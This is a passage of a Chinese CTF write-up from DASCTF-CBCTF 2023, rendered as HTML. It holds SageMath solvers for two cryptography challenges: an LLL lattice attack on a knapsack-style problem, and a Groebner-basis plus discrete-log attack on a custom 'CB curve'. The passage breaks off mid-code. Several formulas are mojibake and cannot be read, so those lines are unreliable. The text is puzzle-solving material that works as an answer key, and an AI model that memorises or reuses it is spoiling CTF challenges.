punctuation\">,</span> <span class=\"token number\">256776519514651</span><span class=\"token punctuation\">,</span> <span class=\"token number\">107733244474073</span><span class=\"token punctuation\">,</span> <span class=\"token number\">216508566448440</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39327578905012</span><span class=\"token punctuation\">,</span> <span class=\"token number\">118682486932022</span><span class=\"token punctuation\">,</span> <span class=\"token number\">263357223061004</span><span class=\"token punctuation\">,</span> <span class=\"token number\">132872609024098</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44605761726563</span><span class=\"token punctuation\">,</span> <span class=\"token number\">24908360451602</span><span class=\"token punctuation\">,</span> <span class=\"token number\">237906955893793</span><span class=\"token punctuation\">,</span> <span class=\"token number\">204469770496199</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7055254513808</span><span class=\"token punctuation\">,</span> <span class=\"token number\">221802659519968</span><span class=\"token punctuation\">,</span> <span class=\"token number\">169686619990988</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23128789035141</span><span class=\"token punctuation\">,</span> <span class=\"token number\">208847144870760</span><span class=\"token punctuation\">,</span> <span class=\"token number\">272339624469135</span><span class=\"token punctuation\">,</span> <span class=\"token number\">269511404473473</span><span class=\"token punctuation\">,</span> <span class=\"token number\">112830627321371</span><span class=\"token punctuation\">,</span> <span class=\"token number\">73203551744776</span><span class=\"token punctuation\">,</span> <span class=\"token number\">42843503010671</span><span class=\"token punctuation\">,</span> <span class=\"token number\">118193938825623</span><span class=\"token punctuation\">,</span> <span class=\"token number\">49625220390324</span><span class=\"token punctuation\">,</span> <span class=\"token number\">230439888723036</span><span class=\"token punctuation\">,</span> <span class=\"token number\">241486656550572</span><span class=\"token punctuation\">,</span> <span class=\"token number\">107149406378865</span><span class=\"token punctuation\">,</span> <span class=\"token number\">233503862264755</span><span class=\"token punctuation\">,</span> <span class=\"token number\">269502011971514</span><span class=\"token punctuation\">,</span> <span class=\"token number\">181805192674559</span><span class=\"token punctuation\">,</span> <span class=\"token number\">152612003195556</span><span class=\"token punctuation\">,</span> <span class=\"token number\">184127512098087</span><span class=\"token punctuation\">,</span> <span class=\"token number\">165959151027513</span><span class=\"token punctuation\">,</span> <span class=\"token number\">188723045133473</span><span class=\"token punctuation\">,</span> <span class=\"token number\">241615906682300</span><span class=\"token punctuation\">,</span> <span class=\"token number\">216101484550038</span><span class=\"token punctuation\">,</span> <span class=\"token number\">81190147709444</span><span class=\"token punctuation\">,</span> <span class=\"token number\">124498742419309</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>re<span class=\"token operator\">=</span><span class=\"token number\">4051501228761632</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>A <span class=\"token operator\">=</span> a<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>bits<span class=\"token operator\">=</span><span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">ju</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> j<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">abs</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> tqdm<span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    temp<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">bin</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>zfill<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    t1<span class=\"token punctuation\">,</span>t2<span class=\"token operator\">=</span>temp<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>temp<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">sum</span><span class=\"token punctuation\">(</span>t1<span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token number\">3</span> <span class=\"token keyword\">or</span> <span class=\"token builtin\">sum</span><span class=\"token punctuation\">(</span>t2<span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    rr <span class=\"token operator\">=</span> <span class=\"token builtin\">sum</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>i<span class=\"token operator\">*</span>j <span class=\"token keyword\">for</span> i<span class=\"token punctuation\">,</span>j <span class=\"token keyword\">in</span> <span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    new_re <span class=\"token operator\">=</span> re <span class=\"token operator\">-</span> rr</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    M<span class=\"token operator\">=</span>Matrix<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">,</span>bits<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>bits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        M<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        M<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>A<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>bits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        M<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    M<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>new_re</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    res<span class=\"token operator\">=</span>M<span class=\"token punctuation\">.</span>LLL<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\">#     j = [abs(j) for j in res[0][:-1]]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">if</span> ju<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'find'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr></table></figure><p>![image](./DASCTF-CBCTF 2023/2902310-20231022105305395-1995945114.png)</p>\n<h2 id=\"cb-curve\"><a class=\"markdownIt-Anchor\" href=\"#cb-curve\">#</a> CB curve</h2>\n<p>给了曲线的点加和数乘运算，但主要用到的是加法，用公式直观表示：</p>\n<p>�3=(�1+�2)(1+��1�2)(1+��1�2)(1−��1�2)</p>\n<p>�3=(�1+�2)(1+��1�2)(1−��1�2)(1+��1�2)</p>\n<p>由于出现了�1+�2 在分子上，因此 (�,�)+(−�,−�)=(0,0)，进一步测试��+(−��)=(0,0)：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>G <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">586066762126624229327260483658353973556531595840920560414263113786807168248797</span><span class=\"token punctuation\">,</span> <span class=\"token number\">66727759687879628160487324122999265926655929132333860726404158613654375336028</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>G_ <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">586066762126624229327260483658353973556531595840920560414263113786807168248797</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">66727759687879628160487324122999265926655929132333860726404158613654375336028</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Q <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">460843895959181097343292934009653542386784127282375019764638432240505304648101</span><span class=\"token punctuation\">,</span> <span class=\"token number\">739422832583403823403837831802136107593509589942947902014204968923412689379907</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># test </span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>test <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>ecc<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>G<span class=\"token punctuation\">,</span>G_<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>q1 <span class=\"token operator\">=</span> ecc<span class=\"token punctuation\">.</span>mul<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span>G<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>q2 <span class=\"token operator\">=</span> ecc<span class=\"token punctuation\">.</span>mul<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span>G_<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ecc<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>q1<span class=\"token punctuation\">,</span>q2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>再结合 <code>def negG(self,G):         return self.mul(570870969979422295249173442435007561272085504844186092739816337605942962972880-1,G)</code>  可以知道 order 是 <code>570870969979422295249173442435007561272085504844186092739816337605942962972880</code> <br>\n 接下来要做的是把 P 点求出来然后想办法求 dlp，这里利用点加法比较特殊的性质结合 gb 基会比较简单：</p>\n<p>��=(��+�)(1+����)(1+����)(1−����)+�</p>\n<p>�ℎ=(��−�)(1−����)(1−����)(1+����)+�</p>\n<p>不难发现如果计算 (�ℎ−�)(��−�) 就可以利用平方差简化式子得到��2−�21−�2��2�2，而题目是给了这样的十对数据，利用 groebner_basis () 就很容易简化计算了。<br>\n后边再做一个映射利用 order 较光滑选几个小因子求 dlp 即可。<br>\n![image](./DASCTF-CBCTF 2023/2902310-20231022114359564-730334472.jpg)<br>\n 给出我的垃圾代码：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> randint</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> sage<span class=\"token punctuation\">.</span><span class=\"token builtin\">all</span> <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">CB_curve</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        self<span class=\"token punctuation\">.</span>p <span class=\"token operator\">=</span> <span class=\"token number\">1141741939958844590498346884870015122543626602665954681008204697160652371664923</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        self<span class=\"token punctuation\">.</span>a <span class=\"token operator\">=</span> <span class=\"token number\">727131475903635498678013730344448225340496007388151739960305539398192321065043</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        self<span class=\"token punctuation\">.</span>b <span class=\"token operator\">=</span> <span class=\"token number\">840714623434321649308065401328602364673881568379142278640950034404861312007307</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> Q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">if</span> P <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">return</span> Q</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">(</span>x1<span class=\"token punctuation\">,</span> y1<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> P</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">(</span>x2<span class=\"token punctuation\">,</span> y2<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> Q</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        x3 <span class=\"token operator\">=</span>  <span class=\"token punctuation\">(</span>x1<span class=\"token operator\">+</span>x2<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token operator\">+</span>self<span class=\"token punctuation\">.</span>a<span class=\"token operator\">*</span>y1<span class=\"token operator\">*</span>y2<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>inverse<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token operator\">+</span>self<span class=\"token punctuation\">.</span>b<span class=\"token operator\">*</span>x1<span class=\"token operator\">*</span>x2<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token operator\">-</span>self<span class=\"token punctuation\">.</span>a<span class=\"token operator\">*</span>y1<span class=\"token operator\">*</span>y2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>self<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>p</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        y3 <span class=\"token operator\">=</span>  <span class=\"token punctuation\">(</span>y1<span class=\"token operator\">+</span>y2<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token operator\">+</span>self<span class=\"token punctuation\">.</span>b<span class=\"token operator\">*</span>x1<span class=\"token operator\">*</span>x2<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>inverse<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token operator\">-</span>self<span class=\"token punctuation\">.</span>b<span class=\"token operator\">*</span>x1<span class=\"token operator\">*</span>x2<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token operator\">+</span>self<span class=\"token punctuation\">.</span>a<span class=\"token operator\">*</span>y1<span class=\"token operator\">*</span>y2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>self<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>p</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>x3<span class=\"token punctuation\">,</span> y3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        Q <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        x <span class=\"token operator\">=</span> x <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>p</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">while</span> x <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token keyword\">if</span> x <span class=\"token operator\">&amp;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                Q <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>Q<span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            P <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>P<span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            x <span class=\"token operator\">=</span> x <span class=\"token operator\">>></span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">return</span> Q</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">negG</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>G<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>mul<span class=\"token punctuation\">(</span><span class=\"token number\">570870969979422295249173442435007561272085504844186092739816337605942962972880</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>G<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>ecc <span class=\"token operator\">=</span> CB_curve<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>G <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">586066762126624229327260483658353973556531595840920560414263113786807168248797</span><span class=\"token punctuation\">,</span> <span class=\"token number\">66727759687879628160487324122999265926655929132333860726404158613654375336028</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>G_ <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">586066762126624229327260483658353973556531595840920560414263113786807168248797</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">66727759687879628160487324122999265926655929132333860726404158613654375336028</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>Q <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">460843895959181097343292934009653542386784127282375019764638432240505304648101</span><span class=\"token punctuation\">,</span> <span class=\"token number\">739422832583403823403837831802136107593509589942947902014204968923412689379907</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token comment\"># test </span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>test <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>ecc<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>G<span class=\"token punctuation\">,</span>G_<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>q1 <span class=\"token operator\">=</span> ecc<span class=\"token punctuation\">.</span>mul<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span>G<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>q2 <span class=\"token operator\">=</span> ecc<span class=\"token punctuation\">.</span>mul<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span>G_<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ecc<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>q1<span class=\"token punctuation\">,</span>q2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\"># attack</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>order <span class=\"token operator\">=</span> <span class=\"token number\">570870969979422295249173442435007561272085504844186092739816337605942962972880</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">908996880816674413953945844149350915331956247471480600840221415119794882139724</span><span class=\"token punctuation\">,</span> <span class=\"token number\">971918808384910355828135603762747020183688585728289421786279444571287619529246</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1285550352531583269956802123237391199017403081800977678246201935580429758051904</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1551774945769448705387900437472951015954157193946719575845523359198154668857591</span><span class=\"token punctuation\">,</span> <span class=\"token number\">676185408751480221545400062950292727848016906516506232986883519673765317932582</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1250300209784131850574858927023046353058343552115735540789593580037130054384362</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1298409778422699298367007023890818793557023853717180295526932023194697263501748</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1332552452292482549702793642987623159617988974910321945878093492007278710993114</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1030239404875082841481045525469865919289388171602293245905162820968158543176773</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1154148024180033719999293176590867264297899817449945744942661351655533433871621</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>ph <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">584297112520340495757457954416165393828472756298945167299482077258411155766756</span><span class=\"token punctuation\">,</span> <span class=\"token number\">886432149227960827335266910774569034430464592640209168563805700117347063152246</span><span class=\"token punctuation\">,</span> <span class=\"token number\">613528590036968449893421430816319461615130635882647544978722093413694101540550</span><span class=\"token punctuation\">,</span> <span class=\"token number\">576162106332135829961234799085370038425761945928004579456101802617485243023987</span><span class=\"token punctuation\">,</span> <span class=\"token number\">627570890346195626159365118862437334953500165050236216404858019114288681512171</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1015503424232985454098149884321288932492551183126601131968495641510550575005042</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1532737675157046782602115678180407262847166210963507805526455422934164759886583</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1540047002602145805476906585925538790245968214992837106009502002588479779602195</span><span class=\"token punctuation\">,</span> <span class=\"token number\">505097517314409449404205152068185149808364887623922221197462411159844816865696</span><span class=\"token punctuation\">,</span> <span class=\"token number\">873498218680784138428154510303205366133389839886911286745954821800632158315951</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>a <span class=\"token operator\">=</span> ecc<span class=\"token punctuation\">.</span>a</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>b <span class=\"token operator\">=</span> ecc<span class=\"token punctuation\">.</span>b</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>p <span class=\"token operator\">=</span> ecc<span class=\"token punctuation\">.</span>p</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>R<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>xp<span class=\"token punctuation\">,</span>e<span class=\"token operator\">>=</span>PolynomialRing<span class=\"token punctuation\">(</span>Zmod<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>F <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    f <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> e<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>ph<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> e<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token operator\">-</span>b<span class=\"token operator\">^</span><span class=\"token number\">2</span><span class=\"token operator\">*</span>xp<span class=\"token operator\">^</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> ecc<span class=\"token punctuation\">.</span>mul<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token operator\">-</span>i<span class=\"token punctuation\">,</span>Q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token 